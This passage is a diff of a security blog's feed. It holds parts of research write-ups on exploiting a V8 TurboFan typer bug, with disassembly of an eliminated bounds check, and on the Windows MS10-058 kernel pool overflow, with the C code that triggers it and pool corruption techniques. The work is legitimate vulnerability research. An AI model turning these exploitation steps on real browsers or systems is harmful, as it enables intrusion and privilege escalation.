+        &lt;span class="n"&gt;replacement&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jsgraph&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;Constant&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;upper&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AsHeapConstant&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;Ref&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
+      &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;upper&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Is&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;MinusZero&lt;/span&gt;&lt;span class="p"&gt;()))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="n"&gt;Factory&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;factory&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jsgraph&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;isolate&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;factory&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+        &lt;span class="n"&gt;ObjectRef&lt;/span&gt; &lt;span class="nf"&gt;minus_zero&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;broker&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;factory&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;minus_zero_value&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
+        &lt;span class="n"&gt;replacement&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jsgraph&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;Constant&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;minus_zero&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+      &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;upper&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Is&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;NaN&lt;/span&gt;&lt;span class="p"&gt;()))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="n"&gt;replacement&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jsgraph&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;NaNConstant&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+      &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;upper&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Is&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Null&lt;/span&gt;&lt;span class="p"&gt;()))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="n"&gt;replacement&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jsgraph&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;NullConstant&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+      &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;upper&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Is&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;PlainNumber&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;upper&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Min&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;upper&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Max&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="n"&gt;replacement&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jsgraph&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;Constant&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;upper&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Min&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
+      &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;upper&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Is&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Undefined&lt;/span&gt;&lt;span class="p"&gt;()))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="n"&gt;replacement&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jsgraph&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;UndefinedConstant&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+      &lt;span class="p"&gt;}&lt;/span&gt;   
+      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;replacement&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="c1"&gt;// Make sure the node has a type.&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;NodeProperties&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;IsTyped&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;replacement&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+          &lt;span class="n"&gt;NodeProperties&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;SetType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;replacement&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;upper&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+        &lt;span class="n"&gt;ReplaceWithValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;replacement&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nf"&gt;Changed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;replacement&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+      &lt;span class="p"&gt;}&lt;/span&gt;   
+    &lt;span class="p"&gt;}&lt;/span&gt;
+  &lt;span class="p"&gt;}&lt;/span&gt;
+  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;NoChange&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We confirm this behaviour using &lt;code&gt;--trace-turbo-reduction&lt;/code&gt;: &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;- In-place update of 200: NumberLessThan(199, 225) by reducer TypeNarrowingReducer
+- Replacement of 200: NumberLessThan(199, 225) with 94: HeapConstant[0x2584e3440659 &amp;lt;true&amp;gt;] by reducer ConstantFoldingReducer
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;At this point, there isn't any proper bound check left.&lt;/p&gt;
+&lt;h3 id="observing-the-generated-assembly"&gt;Observing the generated assembly&lt;/h3&gt;
+&lt;p&gt;Let's run again the previous poc. We'll disassemble the function twice. &lt;/p&gt;
+&lt;p&gt;The first optimized code we can observe contains code related to:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;a CheckedBounds with a length of MaxValue,&lt;/li&gt;
+&lt;li&gt;a bound check with a NumberLessThan with the correct length.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;                =====   FIRST DISASSEMBLY  ===== 
+
+0x11afad03119   119  41c1f91e       sarl r9, 30              // badly_typed &amp;gt;&amp;gt; 30
+0x11afad0311d   11d  478d0c89       leal r9,[r9+r9*4]        // badly_typed * OOB_OFFSET
+
+0x11afad03239   239  4c894de0       REX.W movq [rbp-0x20],r9
+
+// CheckBounds (index = badly_typed, length = Smi::kMaxValue)
+0x11afad0326f   26f  817de0ffffff7f cmpl [rbp-0x20],0x7fffffff
+0x11afad03276   276  0f830c010000   jnc 0x11afad03388  &amp;lt;+0x388&amp;gt; // go to Unreachable
+
+// NumberLessThan (badly_typed, LoadField(array.length) = 2)
+0x11afad0327c   27c  837de002       cmpl [rbp-0x20],0x2
+0x11afad03280   280  0f8308010000   jnc 0x11afad0338e  &amp;lt;+0x38e&amp;gt;
+
+// LoadElement
+0x11afad03286   286  4c8b45e8       REX.W movq r8,[rbp-0x18]  // FixedArray
+0x11afad0328a   28a  4c8b4de0       REX.W movq r9,[rbp-0x20]  // badly_typed * OOB_OFFSET
+0x11afad0328e   28e  c4817b1044c80f vmovsd xmm0,[r8+r9*8+0xf] // arr[bad]
+
+// Unreachable
+0x11afad03388   388  cc             int3l // Unreachable node
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The second disassembly is much more interesting. Indeed, only the code corresponding to the CheckBounds remains. The actual bound check was removed!&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;                     =====  SECOND DISASSEMBLY  ===== 
+
+335 0x2e987c30412f   10f  c1ff1e         sarl rdi, 30 // badly_typed &amp;gt;&amp;gt; 30
+336 0x2e987c304132   112  4c8d4120       REX.W leaq r8,[rcx+0x20]
+337 0x2e987c304136   116  8d3cbf         leal rdi,[rdi+rdi*4] // badly_typed * OOB_OFFSET
+
+// CheckBounds (index = badly_typed, length = Smi::kMaxValue)
+400 0x2e987c304270   250  81ffffffff7f   cmpl rdi,0x7fffffff
+401 0x2e987c304276   256  0f83b9000000   jnc 0x2e987c304335  &amp;lt;+0x315&amp;gt;
+402 0x2e987c30427c   25c  c5fb1044f90f   vmovsd xmm0,[rcx+rdi*8+0xf] // unchecked access!
+
+441 0x2e987c304335   315  cc             int3l  // Unreachable node
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;You can confirm it works by launching &lt;a href="https://github.com/JeremyFetiveau/TurboFan-exploit-for-issue-762874"&gt;the full exploit&lt;/a&gt; on a patched 7.5 d8 shell.&lt;/p&gt;
+&lt;h1 id="conclusion"&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;As discussed in this article, the introduction of aborting CheckBounds kind of kills the CheckBound elimination technique for typer bug exploitation. However, we demonstrated a case where TurboFan would defer the bound checking to a NumberLessThan node that would then be incorrectly constant folded because of a bad typing.&lt;/p&gt;
+&lt;p&gt;Thanks for reading this. Please feel free to shoot me any feedback via my twitter: &lt;a href="https://twitter.com/__x86"&gt;@__x86&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Special thanks to my friends &lt;a href="https://twitter.com/0vercl0k"&gt;Axel Souchet&lt;/a&gt;, &lt;a href="https://twitter.com/yrp604"&gt;yrp604&lt;/a&gt; and &lt;a href="https://twitter.com/munmap"&gt;Georgi Geshev&lt;/a&gt; for their review.&lt;/p&gt;
+&lt;p&gt;Also, if you're interested in TurboFan, don't miss out my future &lt;a href="https://typhooncon.com/speakers/#Jeremy"&gt;typhooncon talk&lt;/a&gt;!&lt;/p&gt;
+&lt;p&gt;A bit before publishing this post, &lt;a href="https://twitter.com/5aelo"&gt;saelo&lt;/a&gt; released a new &lt;a href="http://phrack.org/papers/jit_exploitation.html"&gt;phrack article on jit exploitation&lt;/a&gt; as well as the slides of his &lt;a href="https://saelo.github.io/presentations/41con_19_jit_exploitation_tricks.pdf"&gt;0x41con talk&lt;/a&gt;.&lt;/p&gt;
+&lt;h1 id="references"&gt;References&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;Samuel Groß's latest &lt;a href="http://phrack.org/papers/jit_exploitation.html"&gt;phrack on jit exploitation&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Samuel Groß's talk at 0x41con: &lt;a href="https://saelo.github.io/presentations/41con_19_jit_exploitation_tricks.pdf"&gt;JIT Exploitation Tricks&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;My previous &lt;a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/"&gt;introduction to TurboFan&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Stephen Röttger's zer0con talk: &lt;a href="https://docs.google.com/presentation/d/1DJcWByz11jLoQyNhmOvkZSrkgcVhllIlCHmal1tGzaw"&gt;A guided tour through Chrome's javascript compiler&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://bugs.chromium.org/p/v8/issues/detail?id=8806"&gt;Issue 8806: Harden turbofan's bounds check against typer bugs&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><category term="v8"></category><category term="turbofan"></category><category term="chrome"></category><category term="exploitation"></category></entry><entry><title>Introduction to TurboFan</title><link href="https://doar-e.github.io%5Cblog/2019/01/28/introduction-to-turbofan/" rel="alternate"></link><published>2019-01-28T08:00:00-08:00</published><updated>2019-01-28T08:00:00-08:00</updated><author><name>Jeremy "__x86" Fetiveau</name></author><id>tag:doar-e.github.io\blog,2019-01-28:/2019/01/28/introduction-to-turbofan/</id><summary type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
 &lt;p&gt;Ages ago I wrote a blog post here called &lt;a href="https://doar-e.github.io/blog/2014/03/11/first-dip-into-the-kernel-pool-ms10-058/"&gt;first dip in the kernel pool&lt;/a&gt;, this year we're going to swim in a sea of nodes!&lt;/p&gt;
 &lt;p&gt;The current trend is to attack JavaScript engines and more specifically, optimizing JIT compilers such as &lt;a href="https://v8.dev/"&gt;V8&lt;/a&gt;'s &lt;a href="https://v8.dev/docs/turbofan"&gt;TurboFan&lt;/a&gt;, SpiderMonkey's IonMonkey, JavaScriptCore's Data …&lt;/p&gt;</summary><content type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
 &lt;p&gt;Ages ago I wrote a blog post here called &lt;a href="https://doar-e.github.io/blog/2014/03/11/first-dip-into-the-kernel-pool-ms10-058/"&gt;first dip in the kernel pool&lt;/a&gt;, this year we're going to swim in a sea of nodes!&lt;/p&gt;
@@ -1723,7 +2220,7 @@ Received signal 11 SEGV_MAPERR 000042424242
 &lt;li&gt;&lt;a href="https://saelo.github.io/presentations/blackhat_us_18_attacking_client_side_jit_compilers.pdf"&gt;Samuel Groß's 2018 BlackHat talk on attacking client side JIT compilers&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/"&gt;Andrea Biondo's write up on the Math.expm1 TurboFan bug&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://www.jaybosamiya.com/blog/2019/01/02/krautflare/"&gt;Jay Bosamiya's write up on the Math.expm1 TurboFan bug&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;</content><category term="v8"></category><category term="turbofan"></category><category term="exploitation"></category></entry><entry><title>First dip into the kernel pool : MS10-058</title><link href="/blog/2014/03/11/first-dip-into-the-kernel-pool-ms10-058/" rel="alternate"></link><published>2014-03-11T10:52:37+01:00</published><updated>2014-03-11T10:52:37+01:00</updated><author><name>Jeremy "__x86" Fetiveau</name></author><id>tag:None,2014-03-11:/blog/2014/03/11/first-dip-into-the-kernel-pool-ms10-058/</id><summary type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
+&lt;/ul&gt;</content><category term="v8"></category><category term="turbofan"></category><category term="exploitation"></category></entry><entry><title>First dip into the kernel pool : MS10-058</title><link href="https://doar-e.github.io%5Cblog/2014/03/11/first-dip-into-the-kernel-pool-ms10-058/" rel="alternate"></link><published>2014-03-11T10:52:37+01:00</published><updated>2014-03-11T10:52:37+01:00</updated><author><name>Jeremy "__x86" Fetiveau</name></author><id>tag:doar-e.github.io\blog,2014-03-11:/2014/03/11/first-dip-into-the-kernel-pool-ms10-058/</id><summary type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
 &lt;p&gt;I am currently playing with pool-based memory corruption vulnerabilities. That’s why I wanted to program a PoC exploit for the vulnerability presented by Tarjei Mandt during his first talk “Kernel Pool Exploitation on Windows 7” &lt;a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf"&gt;[3]&lt;/a&gt;. I think it's a good exercise to start learning about pool overflows …&lt;/p&gt;</summary><content type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
 &lt;p&gt;I am currently playing with pool-based memory corruption vulnerabilities. That’s why I wanted to program a PoC exploit for the vulnerability presented by Tarjei Mandt during his first talk “Kernel Pool Exploitation on Windows 7” &lt;a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf"&gt;[3]&lt;/a&gt;. I think it's a good exercise to start learning about pool overflows.&lt;/p&gt;
 
@@ -1770,7 +2267,7 @@ IppSortDestinationAddresses(x,x,x)+3C   call    esi ; ExAllocatePoolWithTag(x,x,
 
 
 &lt;p&gt;You can reach this code using a &lt;em&gt;WSAIoctl&lt;/em&gt; with the code &lt;em&gt;SIO_ADDRESS_LIST_SORT&lt;/em&gt; using a call like this :&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;amp;amp;cb, NULL, NULL)
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;amp;cb, NULL, NULL)
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -1801,15 +2298,15 @@ buffer[0] = 0x17;
 buffer[1] = 0x00;
 sa.lpSockaddr = (LPSOCKADDR)buffer;
 sa.iSockaddrLength = 0x1c;
-pwn-&amp;amp;gt;iAddressCount = 0x40000003;
-memcpy(&amp;amp;amp;pwn-&amp;amp;gt;Address[0],&amp;amp;amp;sa,sizeof(_SOCKET_ADDRESS));
-memcpy(&amp;amp;amp;pwn-&amp;amp;gt;Address[1],&amp;amp;amp;sa,sizeof(_SOCKET_ADDRESS));
-memcpy(&amp;amp;amp;pwn-&amp;amp;gt;Address[2],&amp;amp;amp;sa,sizeof(_SOCKET_ADDRESS));
-memcpy(&amp;amp;amp;pwn-&amp;amp;gt;Address[3],&amp;amp;amp;sa,sizeof(_SOCKET_ADDRESS));
+pwn-&amp;gt;iAddressCount = 0x40000003;
+memcpy(&amp;amp;pwn-&amp;gt;Address[0],&amp;amp;sa,sizeof(_SOCKET_ADDRESS));
+memcpy(&amp;amp;pwn-&amp;gt;Address[1],&amp;amp;sa,sizeof(_SOCKET_ADDRESS));
+memcpy(&amp;amp;pwn-&amp;gt;Address[2],&amp;amp;sa,sizeof(_SOCKET_ADDRESS));
+memcpy(&amp;amp;pwn-&amp;gt;Address[3],&amp;amp;sa,sizeof(_SOCKET_ADDRESS));
 
-WSAStartup(MAKEWORD(2,0), &amp;amp;amp;wd)
+WSAStartup(MAKEWORD(2,0), &amp;amp;wd)
 sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
-WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;amp;amp;cb, NULL, NULL)
+WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;amp;cb, NULL, NULL)
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -1842,11 +2339,11 @@ ExFreePoolWithTag(x,x)+64C                  int     3               ; Trap to De
 &lt;h1 id="exploitation-technique"&gt;Exploitation technique&lt;/h1&gt;
 &lt;h2 id="basic-structure"&gt;Basic structure&lt;/h2&gt;
 &lt;p&gt;As the internals of the pool are thoroughly detailed in Tarjei Mandt’s paper &lt;a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf"&gt;[3]&lt;/a&gt;, I will only be giving a glimpse at the pool descriptor and the pool header structures. The pool memory is divided into several types of pool. Two of them are the paged pool and the non-paged pool. A pool is described by a &lt;em&gt;_POOL_DESCRIPTOR&lt;/em&gt; structure as seen below.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0: kd&amp;amp;gt; dt _POOL_TYPE
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0: kd&amp;gt; dt _POOL_TYPE
 ntdll!_POOL_TYPE
    NonPagedPool = 0n0
    PagedPool = 0n1
-0: kd&amp;amp;gt; dt _POOL_DESCRIPTOR
+0: kd&amp;gt; dt _POOL_DESCRIPTOR
 nt!_POOL_DESCRIPTOR
    +0x000 PoolType         : _POOL_TYPE
    +0x004 PagedLock        : _KGUARDED_MUTEX
@@ -1865,7 +2362,7 @@ nt!_POOL_DESCRIPTOR
 
 
 &lt;p&gt;A pool descriptor references free memory in a free list called &lt;em&gt;ListHeads&lt;/em&gt;. The &lt;em&gt;PendingFrees&lt;/em&gt; field references chunks of memory waiting to be freed to the free list. Pointers to pool descriptor structures are stored in arrays such as &lt;em&gt;PoolVector&lt;/em&gt; (non-paged) or &lt;em&gt;ExpPagedPoolDescriptor&lt;/em&gt; (paged). Each chunk of memory contains a header before the actual data. This is the &lt;em&gt;_POOL_HEADER&lt;/em&gt;. It brings information such as the size of the block or the pool it belongs to.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0: kd&amp;amp;gt; dt _POOL_HEADER
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0: kd&amp;gt; dt _POOL_HEADER
 nt!_POOL_HEADER
    +0x000 PreviousSize     : Pos 0, 9 Bits
    +0x000 PoolIndex        : Pos 9, 7 Bits
@@ -1880,7 +2377,7 @@ nt!_POOL_HEADER
 
 &lt;h2 id="poolindex-overwrite"&gt;PoolIndex overwrite&lt;/h2&gt;
 &lt;p&gt;The basic idea of this attack is to corrupt the &lt;em&gt;PoolIndex&lt;/em&gt; field of a pool header. This field is used when deallocating paged pool chunks in order to know which pool descriptor it belongs to. It is used as an index in an array of pointers to pool descriptors. Thus, if an attacker is able to corrupt it, he can make the pool manager believe that a specific chunk belongs to another pool descriptor. For instance, one could reference a pool descriptor out of the bounds of the array. &lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0: kd&amp;amp;gt; dd ExpPagedPoolDescriptor
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0: kd&amp;gt; dd ExpPagedPoolDescriptor
 82947ae0  84835000 84836140 84837280 848383c0
 82947af0  84839500 00000000 00000000 00000000
 &lt;/pre&gt;&lt;/div&gt;
@@ -1937,7 +2434,7 @@ ExFreePoolWithTag(x,x)+5FE  jmp     short loc_5180C7
 &lt;p&gt;When freeing a chunk, if the deferred freelist contains at least 0x20 entries, &lt;em&gt;ExFreePoolWithTag&lt;/em&gt; is going to actually free those chunks and put them on the appropriate entries of the &lt;em&gt;ListHeads&lt;/em&gt;. &lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCHAR&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x100&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCHAR&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x1208&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; 
 &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCHAR&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x104&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCHAR&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x20&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x140&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="mh"&gt;0x1140&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x140&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mh"&gt;0x1140&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
